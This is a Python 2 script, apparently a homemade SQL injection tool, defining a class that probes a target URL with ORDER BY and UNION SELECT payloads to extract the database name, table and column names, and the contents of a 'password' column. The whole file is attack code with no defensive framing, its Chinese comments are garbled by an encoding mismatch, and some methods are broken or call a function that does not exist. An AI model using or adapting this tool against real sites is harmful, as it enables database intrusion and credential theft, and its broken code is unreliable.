#coding:gb2312
import urllib
import string
import binascii
import re

class mysqlInject():
    def __init__(self,url):
        self.db='database()'
        self.url=url  #��������ַ
        self.dblen=0  #���ݿ�ĳ���
        self.counts=0 #�ֶ���
        self.tables=[] #��
        self.dbname=''

    # ������ݿ�İ汾
    def judgeVersion(self):
        page=urllib.urlopen(self.url).read()
        sql=string.join([self.url,"%20and%20mid(version(),1,1)=523%"],'')
        pagex=urllib.urlopen(self.url).read()
        if page==pagex:
            print ('MYSQL�汾:>5')
        else:
            print ('MYSQL�汾<5')

    #����ֶ���
    def columnCounts(self):
        page=urllib.urlopen(self.url).read()
        for n in range(1,100):
            sql=string.join([self.url,"%20order%20by%20",str(n)],'')
            pagex=urllib.urlopen(sql).read()
            if n==1:
                if page==pagex:
                    print ('����ʹ�� order by �½�')
                else:
                    print ('����ʹ��order by �½�')
                    break
            else:
                if page!=pagex:
                    self.counts=n-1
                    print ('�ֶ���:',self.counts)
                    break
        if self.counts==0:
            print ('δ�ܲ½���ֶ���!')

    #������ǰ���ݿ���,���ݿ��û�
    def inject5Content(self,sql):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+=sql
            url+=',0x25)'
        pagec=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            return strings

    def inject5TableNames(self,DB):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+='group_concat(distinct+table_name)'
            url+=',0x25)'
        url+='%20from%20information_schema.columns%20where%20table_schema='
        url+=DB
        pagec=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            s=strings.split(',')
            return s

    #�½��ֶ���
    def inject5ColumnsName(self,TB):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+='group_concat(distinct+column_name)'
            url+=',0x25)'
        url+='%20from%20information_schema.columns%20where%20table_name='
        url+=TB
        pagec=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            s=strings.split(',')
            return s

    #���ֶ�����
    def inject5CountContent(self,TN,CN):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+=CN
            url+=',0x25)'
        url+='%20from%20'
        url+=TN
        pagex=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagex)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            print  (CN,':',strings)

    #������ݿ�İ汾����4,����ʹ��'��'��ķ���ע��
    def inject5(self):
        d='database()'
        self.database=self.inject5Content(d)
        print (self.database)
        database0x=binascii.b2a_hex(self.database)
        database0x='0x'+database0x
        print (database0x)
        self.inject5TableName(database0x)
        self.inject5TableNames(database0x)
        tb=self.tables[0]
        print ('')
        tb=binascii.b2a_hex(tb)
        tb='0x'+tb
        print (tb)
        self.inject5ColumnsName(tb)
        self.inject5CountContent('gly','password')